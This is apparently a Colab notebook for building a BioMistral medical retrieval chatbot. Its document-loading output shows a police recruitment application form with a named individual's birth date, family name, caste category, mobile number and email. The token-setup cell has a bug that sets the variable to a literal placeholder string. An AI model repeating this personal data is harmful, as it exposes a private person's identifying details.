{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/sunnamsriram1/-Apps/blob/main/sriramBioMistral_chatbot_ipynb_%E0%B0%95%E0%B0%BE%E0%B0%AA%E0%B1%80.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "J177jX51J1Li"
      },
      "source": [
        "# Build BioMistral Medical RAG Chatbot using BioMistral Open Source LLM\n",
        "\n",
        "In the notebook we will build a Medical Chatbot with BioMistral LLM and Heart Health pdf file."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Syag3oIcKHM0"
      },
      "source": [
        "## Installation"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "L18fYAOPJzZX",
        "outputId": "5c2ba4d4-0e09-42ab-ac07-c54e2d8e77a8"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Requirement already satisfied: langchain in /usr/local/lib/python3.10/dist-packages (0.2.16)\n",
            "Requirement already satisfied: sentence-transformers in /usr/local/lib/python3.10/dist-packages (3.0.1)\n",
            "Requirement already satisfied: chromadb in /usr/local/lib/python3.10/dist-packages (0.5.5)\n",
            "Requirement already satisfied: llama-cpp-python in /usr/local/lib/python3.10/dist-packages (0.2.90)\n",
            "Requirement already satisfied: langchain_community in /usr/local/lib/python3.10/dist-packages (0.2.16)\n",
            "Requirement already satisfied: pypdf in /usr/local/lib/python3.10/dist-packages (4.3.1)\n",
            "Requirement already satisfied: PyYAML>=5.3 in /usr/local/lib/python3.10/dist-packages (from langchain) (6.0.2)\n",
            "Requirement already satisfied: SQLAlchemy<3,>=1.4 in /usr/local/lib/python3.10/dist-packages (from langchain) (2.0.32)\n",
            "Requirement already satisfied: aiohttp<4.0.0,>=3.8.3 in /usr/local/lib/python3.10/dist-packages (from langchain) (3.10.5)\n",
            "Requirement already satisfied: async-timeout<5.0.0,>=4.0.0 in /usr/local/lib/python3.10/dist-packages (from langchain) (4.0.3)\n",
            "Requirement already satisfied: langchain-core<0.3.0,>=0.2.38 in /usr/local/lib/python3.10/dist-packages (from langchain) (0.2.39)\n",
            "Requirement already satisfied: langchain-text-splitters<0.3.0,>=0.2.0 in /usr/local/lib/python3.10/dist-packages (from langchain) (0.2.4)\n",
            "Requirement already satisfied: langsmith<0.2.0,>=0.1.17 in /usr/local/lib/python3.10/dist-packages (from langchain) (0.1.117)\n",
            "Requirement already satisfied: numpy<2,>=1 in /usr/local/lib/python3.10/dist-packages (from langchain) (1.26.4)\n",
            "Requirement already satisfied: pydantic<3,>=1 in /usr/local/lib/python3.10/dist-packages (from langchain) (2.8.2)\n",
            "Requirement already satisfied: requests<3,>=2 in /usr/local/lib/python3.10/dist-packages (from langchain) (2.32.3)\n",
            "Requirement already satisfied: tenacity!=8.4.0,<9.0.0,>=8.1.0 in /usr/local/lib/python3.10/dist-packages (from langchain) (8.5.0)\n",
            "Requirement already satisfied: transformers<5.0.0,>=4.34.0 in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (4.44.2)\n",
            "Requirement already satisfied: tqdm in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (4.66.5)\n",
            "Requirement already satisfied: torch>=1.11.0 in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (2.4.0+cu121)\n",
            "Requirement already satisfied: scikit-learn in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (1.3.2)\n",
            "Requirement already satisfied: scipy in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (1.13.1)\n",
            "Requirement already satisfied: huggingface-hub>=0.15.1 in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (0.24.6)\n",
            "Requirement already satisfied: Pillow in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (9.4.0)\n",
            "Requirement already satisfied: build>=1.0.3 in /usr/local/lib/python3.10/dist-packages (from chromadb) (1.2.2)\n",
            "Requirement already satisfied: chroma-hnswlib==0.7.6 in /usr/local/lib/python3.10/dist-packages (from chromadb) (0.7.6)\n",
            "Requirement already satisfied: fastapi>=0.95.2 in /usr/local/lib/python3.10/dist-packages (from chromadb) (0.114.1)\n",
            "Requirement already satisfied: uvicorn>=0.18.3 in /usr/local/lib/python3.10/dist-packages (from uvicorn[standard]>=0.18.3->chromadb) (0.30.6)\n",
            "Requirement already satisfied: posthog>=2.4.0 in /usr/local/lib/python3.10/dist-packages (from chromadb) (3.6.5)\n",
            "Requirement already satisfied: typing-extensions>=4.5.0 in /usr/local/lib/python3.10/dist-packages (from chromadb) (4.12.2)\n",
            "Requirement already satisfied: onnxruntime>=1.14.1 in /usr/local/lib/python3.10/dist-packages (from chromadb) (1.19.2)\n",
            "Requirement already satisfied: opentelemetry-api>=1.2.0 in /usr/local/lib/python3.10/dist-packages (from chromadb) (1.27.0)\n",
            "Requirement already satisfied: opentelemetry-exporter-otlp-proto-grpc>=1.2.0 in /usr/local/lib/python3.10/dist-packages (from chromadb) (1.27.0)\n",
            "Requirement already satisfied: opentelemetry-instrumentation-fastapi>=0.41b0 in /usr/local/lib/python3.10/dist-packages (from chromadb) (0.48b0)\n",
            "Requirement already satisfied: opentelemetry-sdk>=1.2.0 in /usr/local/lib/python3.10/dist-packages (from chromadb) (1.27.0)\n",
            "Requirement already satisfied: tokenizers>=0.13.2 in /usr/local/lib/python3.10/dist-packages (from chromadb) (0.19.1)\n",
            "Requirement already satisfied: pypika>=0.48.9 in /usr/local/lib/python3.10/dist-packages (from chromadb) (0.48.9)\n",
            "Requirement already satisfied: overrides>=7.3.1 in /usr/local/lib/python3.10/dist-packages (from chromadb) (7.7.0)\n",
            "Requirement already satisfied: importlib-resources in /usr/local/lib/python3.10/dist-packages (from chromadb) (6.4.4)\n",
            "Requirement already satisfied: grpcio>=1.58.0 in /usr/local/lib/python3.10/dist-packages (from chromadb) (1.64.1)\n",
            "Requirement already satisfied: bcrypt>=4.0.1 in /usr/local/lib/python3.10/dist-packages (from chromadb) (4.2.0)\n",
            "Requirement already satisfied: typer>=0.9.0 in /usr/local/lib/python3.10/dist-packages (from chromadb) (0.12.5)\n",
            "Requirement already satisfied: kubernetes>=28.1.0 in /usr/local/lib/python3.10/dist-packages (from chromadb) (30.1.0)\n",
            "Requirement already satisfied: mmh3>=4.0.1 in /usr/local/lib/python3.10/dist-packages (from chromadb) (4.1.0)\n",
            "Requirement already satisfied: orjson>=3.9.12 in /usr/local/lib/python3.10/dist-packages (from chromadb) (3.10.7)\n",
            "Requirement already satisfied: httpx>=0.27.0 in /usr/local/lib/python3.10/dist-packages (from chromadb) (0.27.2)\n",
            "Requirement already satisfied: diskcache>=5.6.1 in /usr/local/lib/python3.10/dist-packages (from llama-cpp-python) (5.6.3)\n",
            "Requirement already satisfied: jinja2>=2.11.3 in /usr/local/lib/python3.10/dist-packages (from llama-cpp-python) (3.1.4)\n",
            "Requirement already satisfied: dataclasses-json<0.7,>=0.5.7 in /usr/local/lib/python3.10/dist-packages (from langchain_community) (0.6.7)\n",
            "Requirement already satisfied: aiohappyeyeballs>=2.3.0 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (2.4.0)\n",
            "Requirement already satisfied: aiosignal>=1.1.2 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (1.3.1)\n",
            "Requirement already satisfied: attrs>=17.3.0 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (24.2.0)\n",
            "Requirement already satisfied: frozenlist>=1.1.1 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (1.4.1)\n",
            "Requirement already satisfied: multidict<7.0,>=4.5 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (6.0.5)\n",
            "Requirement already satisfied: yarl<2.0,>=1.0 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (1.9.4)\n",
            "Requirement already satisfied: packaging>=19.1 in /usr/local/lib/python3.10/dist-packages (from build>=1.0.3->chromadb) (24.1)\n",
            "Requirement already satisfied: pyproject_hooks in /usr/local/lib/python3.10/dist-packages (from build>=1.0.3->chromadb) (1.1.0)\n",
            "Requirement already satisfied: tomli>=1.1.0 in /usr/local/lib/python3.10/dist-packages (from build>=1.0.3->chromadb) (2.0.1)\n",
            "Requirement already satisfied: marshmallow<4.0.0,>=3.18.0 in /usr/local/lib/python3.10/dist-packages (from dataclasses-json<0.7,>=0.5.7->langchain_community) (3.22.0)\n",
            "Requirement already satisfied: typing-inspect<1,>=0.4.0 in /usr/local/lib/python3.10/dist-packages (from dataclasses-json<0.7,>=0.5.7->langchain_community) (0.9.0)\n",
            "Requirement already satisfied: starlette<0.39.0,>=0.37.2 in /usr/local/lib/python3.10/dist-packages (from fastapi>=0.95.2->chromadb) (0.38.5)\n",
            "Requirement already satisfied: anyio in /usr/local/lib/python3.10/dist-packages (from httpx>=0.27.0->chromadb) (3.7.1)\n",
            "Requirement already satisfied: certifi in /usr/local/lib/python3.10/dist-packages (from httpx>=0.27.0->chromadb) (2024.8.30)\n",
            "Requirement already satisfied: httpcore==1.* in /usr/local/lib/python3.10/dist-packages (from httpx>=0.27.0->chromadb) (1.0.5)\n",
            "Requirement already satisfied: idna in /usr/local/lib/python3.10/dist-packages (from httpx>=0.27.0->chromadb) (3.8)\n",
            "Requirement already satisfied: sniffio in /usr/local/lib/python3.10/dist-packages (from httpx>=0.27.0->chromadb) (1.3.1)\n",
            "Requirement already satisfied: h11<0.15,>=0.13 in /usr/local/lib/python3.10/dist-packages (from httpcore==1.*->httpx>=0.27.0->chromadb) (0.14.0)\n",
            "Requirement already satisfied: filelock in /usr/local/lib/python3.10/dist-packages (from huggingface-hub>=0.15.1->sentence-transformers) (3.15.4)\n",
            "Requirement already satisfied: fsspec>=2023.5.0 in /usr/local/lib/python3.10/dist-packages (from huggingface-hub>=0.15.1->sentence-transformers) (2024.6.1)\n",
            "Requirement already satisfied: MarkupSafe>=2.0 in /usr/local/lib/python3.10/dist-packages (from jinja2>=2.11.3->llama-cpp-python) (2.1.5)\n",
            "Requirement already satisfied: six>=1.9.0 in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (1.16.0)\n",
            "Requirement already satisfied: python-dateutil>=2.5.3 in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (2.8.2)\n",
            "Requirement already satisfied: google-auth>=1.0.1 in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (2.27.0)\n",
            "Requirement already satisfied: websocket-client!=0.40.0,!=0.41.*,!=0.42.*,>=0.32.0 in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (1.8.0)\n",
            "Requirement already satisfied: requests-oauthlib in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (1.3.1)\n",
            "Requirement already satisfied: oauthlib>=3.2.2 in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (3.2.2)\n",
            "Requirement already satisfied: urllib3>=1.24.2 in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (2.0.7)\n",
            "Requirement already satisfied: jsonpatch<2.0,>=1.33 in /usr/local/lib/python3.10/dist-packages (from langchain-core<0.3.0,>=0.2.38->langchain) (1.33)\n",
            "Requirement already satisfied: coloredlogs in /usr/local/lib/python3.10/dist-packages (from onnxruntime>=1.14.1->chromadb) (15.0.1)\n",
            "Requirement already satisfied: flatbuffers in /usr/local/lib/python3.10/dist-packages (from onnxruntime>=1.14.1->chromadb) (24.3.25)\n",
            "Requirement already satisfied: protobuf in /usr/local/lib/python3.10/dist-packages (from onnxruntime>=1.14.1->chromadb) (3.20.3)\n",
            "Requirement already satisfied: sympy in /usr/local/lib/python3.10/dist-packages (from onnxruntime>=1.14.1->chromadb) (1.13.2)\n",
            "Requirement already satisfied: deprecated>=1.2.6 in /usr/local/lib/python3.10/dist-packages (from opentelemetry-api>=1.2.0->chromadb) (1.2.14)\n",
            "Requirement already satisfied: importlib-metadata<=8.4.0,>=6.0 in /usr/local/lib/python3.10/dist-packages (from opentelemetry-api>=1.2.0->chromadb) (8.4.0)\n",
            "Requirement already satisfied: googleapis-common-protos~=1.52 in /usr/local/lib/python3.10/dist-packages (from opentelemetry-exporter-otlp-proto-grpc>=1.2.0->chromadb) (1.65.0)\n",
            "Requirement already satisfied: opentelemetry-exporter-otlp-proto-common==1.27.0 in /usr/local/lib/python3.10/dist-packages (from opentelemetry-exporter-otlp-proto-grpc>=1.2.0->chromadb) (1.27.0)\n",
            "Requirement already satisfied: opentelemetry-proto==1.27.0 in /usr/local/lib/python3.10/dist-packages (from opentelemetry-exporter-otlp-proto-grpc>=1.2.0->chromadb) (1.27.0)\n",
            "Requirement already satisfied: opentelemetry-instrumentation-asgi==0.48b0 in /usr/local/lib/python3.10/dist-packages (from opentelemetry-instrumentation-fastapi>=0.41b0->chromadb) (0.48b0)\n",
            "Requirement already satisfied: opentelemetry-instrumentation==0.48b0 in /usr/local/lib/python3.10/dist-packages (from opentelemetry-instrumentation-fastapi>=0.41b0->chromadb) (0.48b0)\n",
            "Requirement already satisfied: opentelemetry-semantic-conventions==0.48b0 in /usr/local/lib/python3.10/dist-packages (from opentelemetry-instrumentation-fastapi>=0.41b0->chromadb) (0.48b0)\n",
            "Requirement already satisfied: opentelemetry-util-http==0.48b0 in /usr/local/lib/python3.10/dist-packages (from opentelemetry-instrumentation-fastapi>=0.41b0->chromadb) (0.48b0)\n",
            "Requirement already satisfied: setuptools>=16.0 in /usr/local/lib/python3.10/dist-packages (from opentelemetry-instrumentation==0.48b0->opentelemetry-instrumentation-fastapi>=0.41b0->chromadb) (71.0.4)\n",
            "Requirement already satisfied: wrapt<2.0.0,>=1.0.0 in /usr/local/lib/python3.10/dist-packages (from opentelemetry-instrumentation==0.48b0->opentelemetry-instrumentation-fastapi>=0.41b0->chromadb) (1.16.0)\n",
            "Requirement already satisfied: asgiref~=3.0 in /usr/local/lib/python3.10/dist-packages (from opentelemetry-instrumentation-asgi==0.48b0->opentelemetry-instrumentation-fastapi>=0.41b0->chromadb) (3.8.1)\n",
            "Requirement already satisfied: monotonic>=1.5 in /usr/local/lib/python3.10/dist-packages (from posthog>=2.4.0->chromadb) (1.6)\n",
            "Requirement already satisfied: backoff>=1.10.0 in /usr/local/lib/python3.10/dist-packages (from posthog>=2.4.0->chromadb) (2.2.1)\n",
            "Requirement already satisfied: annotated-types>=0.4.0 in /usr/local/lib/python3.10/dist-packages (from pydantic<3,>=1->langchain) (0.7.0)\n",
            "Requirement already satisfied: pydantic-core==2.20.1 in /usr/local/lib/python3.10/dist-packages (from pydantic<3,>=1->langchain) (2.20.1)\n",
            "Requirement already satisfied: charset-normalizer<4,>=2 in /usr/local/lib/python3.10/dist-packages (from requests<3,>=2->langchain) (3.3.2)\n",
            "Requirement already satisfied: greenlet!=0.4.17 in /usr/local/lib/python3.10/dist-packages (from SQLAlchemy<3,>=1.4->langchain) (3.0.3)\n",
            "Requirement already satisfied: networkx in /usr/local/lib/python3.10/dist-packages (from torch>=1.11.0->sentence-transformers) (3.3)\n",
            "Requirement already satisfied: regex!=2019.12.17 in /usr/local/lib/python3.10/dist-packages (from transformers<5.0.0,>=4.34.0->sentence-transformers) (2024.5.15)\n",
            "Requirement already satisfied: safetensors>=0.4.1 in /usr/local/lib/python3.10/dist-packages (from transformers<5.0.0,>=4.34.0->sentence-transformers) (0.4.4)\n",
            "Requirement already satisfied: click>=8.0.0 in /usr/local/lib/python3.10/dist-packages (from typer>=0.9.0->chromadb) (8.1.7)\n",
            "Requirement already satisfied: shellingham>=1.3.0 in /usr/local/lib/python3.10/dist-packages (from typer>=0.9.0->chromadb) (1.5.4)\n",
            "Requirement already satisfied: rich>=10.11.0 in /usr/local/lib/python3.10/dist-packages (from typer>=0.9.0->chromadb) (13.8.0)\n",
            "Requirement already satisfied: httptools>=0.5.0 in /usr/local/lib/python3.10/dist-packages (from uvicorn[standard]>=0.18.3->chromadb) (0.6.1)\n",
            "Requirement already satisfied: python-dotenv>=0.13 in /usr/local/lib/python3.10/dist-packages (from uvicorn[standard]>=0.18.3->chromadb) (1.0.1)\n",
            "Requirement already satisfied: uvloop!=0.15.0,!=0.15.1,>=0.14.0 in /usr/local/lib/python3.10/dist-packages (from uvicorn[standard]>=0.18.3->chromadb) (0.20.0)\n",
            "Requirement already satisfied: watchfiles>=0.13 in /usr/local/lib/python3.10/dist-packages (from uvicorn[standard]>=0.18.3->chromadb) (0.24.0)\n",
            "Requirement already satisfied: websockets>=10.4 in /usr/local/lib/python3.10/dist-packages (from uvicorn[standard]>=0.18.3->chromadb) (13.0.1)\n",
            "Requirement already satisfied: joblib>=1.1.1 in /usr/local/lib/python3.10/dist-packages (from scikit-learn->sentence-transformers) (1.4.2)\n",
            "Requirement already satisfied: threadpoolctl>=2.0.0 in /usr/local/lib/python3.10/dist-packages (from scikit-learn->sentence-transformers) (3.5.0)\n",
            "Requirement already satisfied: cachetools<6.0,>=2.0.0 in /usr/local/lib/python3.10/dist-packages (from google-auth>=1.0.1->kubernetes>=28.1.0->chromadb) (5.5.0)\n",
            "Requirement already satisfied: pyasn1-modules>=0.2.1 in /usr/local/lib/python3.10/dist-packages (from google-auth>=1.0.1->kubernetes>=28.1.0->chromadb) (0.4.0)\n",
            "Requirement already satisfied: rsa<5,>=3.1.4 in /usr/local/lib/python3.10/dist-packages (from google-auth>=1.0.1->kubernetes>=28.1.0->chromadb) (4.9)\n",
            "Requirement already satisfied: zipp>=0.5 in /usr/local/lib/python3.10/dist-packages (from importlib-metadata<=8.4.0,>=6.0->opentelemetry-api>=1.2.0->chromadb) (3.20.1)\n",
            "Requirement already satisfied: jsonpointer>=1.9 in /usr/local/lib/python3.10/dist-packages (from jsonpatch<2.0,>=1.33->langchain-core<0.3.0,>=0.2.38->langchain) (3.0.0)\n",
            "Requirement already satisfied: markdown-it-py>=2.2.0 in /usr/local/lib/python3.10/dist-packages (from rich>=10.11.0->typer>=0.9.0->chromadb) (3.0.0)\n",
            "Requirement already satisfied: pygments<3.0.0,>=2.13.0 in /usr/local/lib/python3.10/dist-packages (from rich>=10.11.0->typer>=0.9.0->chromadb) (2.16.1)\n",
            "Requirement already satisfied: exceptiongroup in /usr/local/lib/python3.10/dist-packages (from anyio->httpx>=0.27.0->chromadb) (1.2.2)\n",
            "Requirement already satisfied: mypy-extensions>=0.3.0 in /usr/local/lib/python3.10/dist-packages (from typing-inspect<1,>=0.4.0->dataclasses-json<0.7,>=0.5.7->langchain_community) (1.0.0)\n",
            "Requirement already satisfied: humanfriendly>=9.1 in /usr/local/lib/python3.10/dist-packages (from coloredlogs->onnxruntime>=1.14.1->chromadb) (10.0)\n",
            "Requirement already satisfied: mpmath<1.4,>=1.1.0 in /usr/local/lib/python3.10/dist-packages (from sympy->onnxruntime>=1.14.1->chromadb) (1.3.0)\n",
            "Requirement already satisfied: mdurl~=0.1 in /usr/local/lib/python3.10/dist-packages (from markdown-it-py>=2.2.0->rich>=10.11.0->typer>=0.9.0->chromadb) (0.1.2)\n",
            "Requirement already satisfied: pyasn1<0.7.0,>=0.4.6 in /usr/local/lib/python3.10/dist-packages (from pyasn1-modules>=0.2.1->google-auth>=1.0.1->kubernetes>=28.1.0->chromadb) (0.6.0)\n"
          ]
        }
      ],
      "source": [
        "!pip install langchain sentence-transformers chromadb llama-cpp-python langchain_community pypdf"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "4FopYAa6Krjj"
      },
      "source": [
        "## Import libraries"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "kGXeRCdILsha"
      },
      "outputs": [],
      "source": [
        "from langchain_community.document_loaders import PyPDFDirectoryLoader\n",
        "from langchain.text_splitter import CharacterTextSplitter,RecursiveCharacterTextSplitter\n",
        "from langchain_community.embeddings import HuggingFaceEmbeddings\n",
        "from langchain.vectorstores import FAISS, Chroma\n",
        "from langchain_community.llms import LlamaCpp\n",
        "from langchain.chains import RetrievalQA, LLMChain"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "0zEnm5dLTd7s"
      },
      "outputs": [],
      "source": [
        "import pathlib\n",
        "import textwrap\n",
        "from IPython.display import display\n",
        "from IPython.display import Markdown\n",
        "\n",
        "\n",
        "\n",
        "def to_markdown(text):\n",
        "  text = text.replace('•', '  *')\n",
        "  return Markdown(textwrap.indent(text, '> ', predicate=lambda _: True))"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "XXu9elVHUX1G"
      },
      "outputs": [],
      "source": [
        "# Used to securely store your API key\n",
        "from google.colab import userdata"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "DmzD-oWKLtOJ"
      },
      "source": [
        "## Setup HuggingFace Access Token\n",
        "\n",
        "- Log in to [HuggingFace.co](https://huggingface.co/)\n",
        "- Click on your profile icon at the top-right corner, then choose [“Settings.”](https://huggingface.co/settings/)\n",
        "- In the left sidebar, navigate to [“Access Token”](https://huggingface.co/settings/tokens)\n",
        "- Generate a new access token, assigning it the “write” role.\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "St7dpcL4UiX0"
      },
      "outputs": [],
      "source": [
        "# Or use `os.getenv('HUGGINGFACEHUB_API_TOKEN')` to fetch an environment variable.\n",
        "import os\n",
        "from getpass import getpass\n",
        "\n",
        "HUGGINGFACEHUB_API_TOKEN = userdata.get(\"HUGGINGFACEHUB_API_TOKEN\")\n",
        "os.environ[\"HUGGINGFACEHUB_API_TOKEN\"] = \"HUGGINGFACEHUB_API_TOKEN\""
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "KFyNhHmsMYBC"
      },
      "source": [
        "## Import document"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Z2O4acnZmg66",
        "outputId": "ca5e3567-a6b7-44b0-fc09-835b7774219c"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Mounted at /content/drive\n"
          ]
        }
      ],
      "source": [
        "#connect to google drive\n",
        "from google.colab import drive\n",
        "drive.mount('/content/drive') #Fixed typo in directory name"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "bOrnY8dgMdxt"
      },
      "outputs": [],
      "source": [
        "loader = PyPDFDirectoryLoader(\"/content/drive/MyDrive/Pdf\")\n",
        "docs = loader.load()"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "K1TTrH5QNQxa",
        "outputId": "f14087f7-f14a-4ecc-b53c-2a9c11716e18"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216 (3).pdf', 'page': 0}, page_content=\"STATE LEVEL POLICE RECRUITMENT BOARD, ANDHRA PRADESH,\\nMANGALAGIRI.\\n  \\nFILLED IN ONLINE APPLICATION FORM\\n  \\nFor the posts of SCT PCs (Civil) (Men & Women),  \\n  \\nSCT PCs (APSP) (Men) in Police Dept.\\n  \\n  Vide Notification Rc.No.161/SLPRB/Rect.2/2022, dt: 28.11.2022.\\nBasic Details\\nRegistration No.\\n4159216\\n1. Name of the Candidate\\n  \\n(as per SSC or Equivalent Certificate)\\nSUNNAM SEETHARAM\\n2. Father's/ Husband's Name\\nS VEERRAJU\\n3. Gender\\nMale\\n4. Date of Birth\\n  \\n(as per SSC or Equivalent certificate)\\n16-Aug-1996\\n5. SSC/Equivalent Roll No\\n1111127157\\n6. Community\\nABO-ST\\n7. Mobile No.\\n8688655324\\n8. e-Mail Id\\nbtgsuryacomputers@gmail.com\\nAge Relaxation Details\\n9. As per the information you provided in Column Nos. 9 & 10 in Online Application Form (Stage 1), do you \\ncome under the Reservation Quota?\\nABO-ST\\na) Do You come under Creamylayer or Non-Creamylayer\\nNA\\nb) Sub Caste(BC-E Candidates)\\nNA\\n10. Do you claim benefit of Physical Measurements and age Relaxtion under category of ABO-ST? (Please \\ngo through the Notification)\\nYes\\nWhat is your Native Scheduled Area\\nButtaygudem (Wholly)\\n11. Do you claim age relaxation under category Employee of the A.P. Government? (Please go through the \\nNotification)\\nNo\\ni) Date of Joining in Service\\nNA\\nii) Length of Service as on 28.11.2022\\nNA\\niii) Are you still in Service\\nNA\\n12. Do you claim age relaxation under Ex-servicemen and also  relaxation in Physical Efficiency Test under \\nEx-servicemen Category? (Please go through the Notification)\\nNo\\ni) Ex-servicemen Joining Date \\nNA\\nii) Ex-servicemen Date Of Discharge \\nNA\\niii) Total Service rendered\\nNA\\n13. Are you still working in Army,Navy or Airforce of the Union as on date of notification (28-11-2022)?\\nNA\\ni) Date of Entry in Service\\nNA\\nii) Likely date of discharge\\nNA\\n14. Do you claim age relaxation for having worked as an instructor in NCC? (Please go through the \\nNotification)\\nNo\\ni) Date of Entry\\nNA\\nii) Date of Discharge\\nNA\\niii) Total Service rendered\\nNA\\n15. Do you claim age relaxation for having Employed in the State Census Department during 1991? (Please \\ngo through the Notification) \\nNo\\nPage 1 of 5\\nReport generated on : 23-08-2024 08:45:12\\n\"),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216 (3).pdf', 'page': 1}, page_content=\"If yes, Length of Service in Census Department during 1991 (in Days)\\nNA\\n16. Do you claim age relaxation under Home Guard Category? (Please go through the Notification)\\nYou may note that this is Applicable to Home Guard Working in Andhra Prasesh State Government \\nNo\\ni) Name of the Unit\\nNA\\nii) Date of enrollment\\nNA\\niii) No of years since enrollment\\nNA\\niv)  No. of days worked as Home Guard between 28.11.2020 to \\n28.11.2022\\nNA\\nv) Are you still working as Home Guard in AP as on 28.11.2022?\\nNA\\n17. Do you claim age- relaxation under Widow, Divorcee/Judicially separated women?\\nNA\\ni) If widow, furnish the Date of death of the Spouse\\nNA\\nii) If divorced women or judicially separated from her husband, \\ninform the date of divorce or date of Judicial Separated \\nNA\\n18. Do you claim age relaxation and Reservation under EWS Category? (Please go through the Notification)\\nNA\\nDate of issuing the EWS certificate\\nNA\\nSpecial Representation Details\\n19. Do you claim benefit of Special Representation for the post code nos. 21 & 23\\nNo\\nI) If yes, furnish the applicable category\\nNA\\na).  Furnish the details if you claim Special Representation under the Meritorious Sports Person Quota? (You should satisfy the \\nconditions as given in the Notification) \\nMeritorious Sports Persons-1\\nNA\\nName of the Sport / Game-1\\nMeritorious Sports Persons-2\\nNA\\nName of the Sport / Game-2\\nMeritorious Sports Persons-3\\nNA\\nName of the Sport / Game-3\\nb). Furnish details of your parent if you claim Special Representation under Children of Police Personnel (CPP) Quota?\\ni) Date of enrollment of your parent\\nNA\\nii) Name of the post\\nNA\\niii) Name of the Unit\\nNA\\niv) Was your parent 'working' or 'retired' or 'dead' as on 28.11.2022\\nNA\\nc). For Children of Deceased & Incapacitated (CDI) Police Personnels due to violent action of extremists/Criminals/ Anti-Social \\nelements & retired on medical invalidation while on duty only. Furnish details of your parent if you claim Special Representation \\nunder CDI Quota? \\ni) Date of enrollment of your parent\\nNA\\nii) Name of the post\\nNA\\niii) Name of the Unit\\nNA\\niv) Is your parent dead or retired on medical invalidation as on \\n28.11.2022\\nNA\\nd). Furnish the details if you claim Special Representation under  NCC ( NCC-A, NCC-B, NCC-C) Quota?\\nNCC-A\\nNA\\nDate on which the Certificate was \\nobtained\\nNA\\nNCC-B\\nNA\\nDate on which the Certificate was \\nobtained\\nNA\\nNCC-C\\nNA\\nDate on which the Certificate was \\nobtained\\nNA\\ne).Furnish details if you claim Special Representation under Home Guard Quota? (HG)   (those who are working in Andhra \\nPradesh Government only)\\ni) Name of the Unit\\nNA\\nii) Date of enrollment\\nNA\\niii) No.of years since enrollment\\nNA\\nPage 2 of 5\\nReport generated on : 23-08-2024 08:45:12\\n\"),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216 (3).pdf', 'page': 2}, page_content='iv) No. of days worked as Home Guard between 28.11.2020 to \\n28.11.2022\\nNA\\nv) Are you still working as Home Guard in AP as on 28.11.2022\\nNA\\nOther Details\\n20. Which is your preferred place for writing Final Written Test?\\n1st Preference\\nkakinada\\n2nd Preference\\nVisakhapatnam\\n3rd Preference\\nGuntur\\n21. Have you been involved in any Criminal case till today?\\nNo\\nNumber of Criminal cases you were involved.\\n1.Crime No. & Year \\nNA & NA\\nName of the Police Station\\nNA\\nName of the District\\nNA\\nWere you arrested by the Police in this case?\\nNA\\nWere you prosecuted by the Police in this case?\\nNA\\nFurnish the present stage of the case.\\nNA\\n2.Crime No. & Year \\nNA & NA\\nName of the Police Station\\nNA\\nName of the District\\nNA\\nWere you arrested by the Police in this case?\\nNA\\nWere you prosecuted by the Police in this case?\\nNA\\nFurnish the present stage of the case.\\nNA\\n3.Crime No. & Year \\nNA &NA\\nName of the Police Station\\nNA\\nName of the District\\nNA\\nWere you arrested by the Police in this case?\\nNA\\nWere you prosecuted by the Police in this case?\\nNA\\nFurnish the present stage of the case.\\nNA\\n4.Crime No. & Year \\nNA &NA\\nName of the Police Station\\nNA\\nName of the District\\nNA\\nWere you arrested by the Police in this case?\\nNA\\nWere you 